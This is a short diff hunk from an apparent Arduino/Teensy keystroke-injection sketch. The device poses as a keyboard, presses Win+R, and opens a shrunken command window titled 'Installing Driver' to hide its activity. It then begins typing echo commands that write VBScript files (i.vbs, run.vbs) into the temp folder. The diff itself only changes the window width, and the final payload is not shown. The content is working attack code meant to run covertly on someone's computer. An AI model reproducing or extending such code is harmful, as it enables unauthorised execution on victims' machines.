@@ -67,7 +67,7 @@ void setup() {
    Keyboard.set_key1(KEY_R);                                  
    Keyboard.send_now();                                          
    delay(200);                                                  
-   Keyboard.println("cmd /T:32 /K \"mode con: cols=14 lines=1&mode con: delay=0&title Installing Driver\"");                                                                   
+   Keyboard.println("cmd /T:32 /K \"mode con: cols=16 lines=1&mode con: delay=0&title Installing Driver\"");                                                                   
    delay(300);
    Keyboard.println("echo Set F=CreateObject(\"Scripting.FileSystemObject\")>%tmp%\\i.vbs");   
    Keyboard.println("echo o=F.getspecialfolder(2)^&\"\\run.vbs\">>%tmp%\\i.vbs");   
